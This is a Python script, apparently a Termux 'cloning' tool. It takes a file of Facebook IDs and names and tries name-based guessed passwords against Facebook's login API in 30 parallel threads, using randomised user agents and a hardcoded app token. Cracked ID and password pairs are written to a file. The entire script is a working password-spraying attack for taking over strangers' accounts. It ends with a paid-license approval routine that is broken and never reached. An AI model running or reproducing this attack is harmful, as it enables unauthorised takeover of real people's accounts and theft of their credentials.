#WRITTEN BY XVLEGENDARYACE 
#FOLLOW MY GITHUB : https://github.com/MR-DIPTO-404
#----------import----------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import requests
import random 
import json
import sys
#----------color---------#
R = '\033[1;91m'
W = '\033[1;97m'
G = '\033[1;32m' 
Y = '\033[1;33m'
B = '\033[1;34m'
O = '\033[1;35m'
S = '\033[1;37m'
my_color = [R, W, G, Y, B, O, S]
mk = [G]
CO = random.choice(mk)
F = random.choice(my_color)
#----------logo----------#
logo=(f"""                       
{CO}L    EEEE  GGG  EEEE N   N DDD 
{S}L    E    G     E    NN  N D  D  
{CO}L    EEE  G  GG EEE  N N N D  D   
{S}L    E    G   G E    N  NN D  D  
{CO}LLLL EEEE  GGG  EEEE N   N DDD                                                                                        
{S}●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●{W}
{CO}WONER: LEGENDARYACE 
{CO}FACEBOOK: Legends Aryace
{CO}TOOLS: RANDOM 
{CO}VERSION: TRAIL 
{S}●{R}●{W}●{Y}●{B}●{O}●{R}●{W}●{Y}●{B}●{O}●{R}●{W}●{Y}●{B}●{O}●{S}●{R}●{W}●{Y}●{B}●{O}●{S}●{R}●{W}●{Y}●{B}●{O}●{S}●{R}●{B}●{Y}●{S}""")
#----------clear----------#
def clear():
    os.system('clear')
    print(logo)
    print(42*'\033[1;32m=')
    print(' FACEBOOK : Legends Ary Ace')
    print(' WHATSAPP : +8801837478901 ')
    print(42*'=')
#----------line----------#
def line():
    print(42*'-')
#----------menu----------#
def main():
    clear()
    print(' [A] FILE CLONING ')
    print(' [E] EXIT ')
    line()
    option=input(' [??] CHOICE MENU : ')
    if option in ['a','A','1']:
        __file__()
    else:
        exit(' THANKS FOR USING ')
#----------file----------#
def __file__():
    clear()
    filex=input(' [??] ENTER FILE PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found !!');slp(2)
        __file__()
    clear()
    try:
        pas_limit=int(input(' [??] ENTER PASSWORD LIMIT (1-20) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    print(' EXAMPLE : first123, first1234, first12345, first last') 
    for i in range(pas_limit):
        pasx=input(f' [??] ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as Dipto:
        tl=str(len(fo))
        clear()
        print(' TOTAL ACCOUNT : '+tl)
        print(' USE AIRPLANE MODE FOR SPEED UP')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            Dipto.submit(m1,ids,names,passlist)
    line()
    print(' THE PROCESS HAS BEEN COMPLETE')
    input(' PRESS ENTER TO BACK : ')
    main()
loop=0
oks=[]
cps=[]
ugen=[] 
#Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/300.0.0.7.111;]  
for ua in range(10000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['8','9','10','11','12','13'])
      c='moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,77)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/300.0.0.7.111;]'
      xx=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(xx)
#----------method------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r [RUNNING] %s|ALIVE:%s '%(loop,len(oks)));sys.stdout.flush()
            pro = random.choice(ugen)
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': pro, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
            req=requests.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print('\r\r [OK] '+ids+'|'+pas)
                os.system('espeak -a 300 "CONGRATULATIONS FOR OK I D"')
                open('/sdcard/fileok.txt', 'a').write( ids+' | '+pas+' \n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r [CHECK PLEASE] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#----------end----------#
main()

def main_apv():
    os.system('clear')
    #Wasi ke jaga apna name likhlo 
    ak="Legend"
    logo()
    #apni id ke link dal lo 
    os.system('xdg-open https://www.Facebook.com/MrQureshi-xd')
    try:
    	#qureshi ke jaga apna mame lagau
        key1=open('/data/data/com.termux/files/usr/bin/. legend-cov', 'r').read()
    except IOError:
        os.system("clear")
        logo()
        print ("[*]--------------------------------------------------------------")
        print ("  Your Token Is Not Approved Already")
        print ("[*]--------------------------------------------------------------")
        print ("           THIS TOOL IS PAID RS 150")
        print ("           THIS IS YOUR KEY BRO")
        print ("[*]--------------------------------------------------------------")
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid)
        print ("[*]--------------------------------------------------------------")
        #qureshi ke jaga apna name or kch ni cherna
        kok=open('/data/data/com.termux/files/usr/bin/.qureshi-cov', 'w')
        kok.close()
        print ("")
        print ("")
        print ("     Copy Key And Sent Me WhatsApp Approvel Your Key ")
        print ("[*]--------------------------------------------------------------")
        time.sleep(6)
        #nichy number ki hata k apna numbr dal lo 
        os.system("xdg-open https://wa.me/+01837478901")
        #nichy  link hata k apni github ke link lagau
    r1=requests.get("https://github.com/Legendhj/XVLEGEND/blob/main/Fuck.txt").text
    if key1 in r1:
    	#R ke jaga apne main jahan sy script started krna chahty wo lagao 
        main()
    else:
        os.system("clear")
        logo()
        print ("[*]--------------------------------------------------------------")
        print ("  Your Token Is Not Approved Already")
        print ("[*]--------------------------------------------------------------")
        print ("          THIS IS YOUR KEY BRO")
        print ("[*]--------------------------------------------------------------")
        print ("")
        print ("          YOUR KEY : "+ak+key1)
        print ("[*]--------------------------------------------------------------")
        print ("     Copy Key And Sent Me WP Approvel Your Key ")
        print ("[*]--------------------------------------------------------------")
        time.sleep(3.5)
        #Numbr chnge krlyna
        os.system("xdg-open https://wa.me/+01837478901")